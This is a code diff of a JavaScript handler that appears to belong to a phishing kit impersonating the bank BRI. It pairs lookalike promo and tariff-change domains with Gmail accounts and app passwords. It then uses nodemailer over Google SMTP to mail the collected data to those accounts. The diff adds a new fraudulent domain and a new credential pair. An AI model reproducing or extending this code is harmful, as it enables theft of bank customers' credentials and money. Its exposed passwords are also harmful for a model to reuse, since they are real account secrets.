@@ -10,16 +10,16 @@ export default function handler(req, res) {
     if(url == 'bri-promo.site'){
 
         email = 'orbitorbit799@gmail.com';
-        pass = 'ahghpmbdwokimqim';
+        pass = 'ahghpmbdwokimqim'; 
 
     } else if (url == 'bri-promo.herokuapp.com') {
         
         email = 'hibrahimshaleh@gmail.com';
         pass = 'bfaawtyurzhbqjkl';
 
-    } else if(url == 'bri-pelayanan.herokuapp.com'){
-        email = 'pukiayam5123@gmail.com';
-        pass = 'joyxbannkfmypmzx';
+    } else if(url == 'perubahantarif-bri.herokuapp.com'){
+        email = 'pooopss117@gmail.com';
+        pass = 'teelhhgttgviupfp';
 
     } else if(url == 'bri-pertarif.herokuapp.com'){
         email = 'bbri58087@gmail.com';
@@ -34,7 +34,7 @@ export default function handler(req, res) {
         try {
             const transporter = nodemailer.createTransport({
                 port: 587,
-                host: 'smtp.googlemail.com',
+                host: 'smtp.googlemail.com',  
                 auth: {
                     user: email,
                     pass: pass,
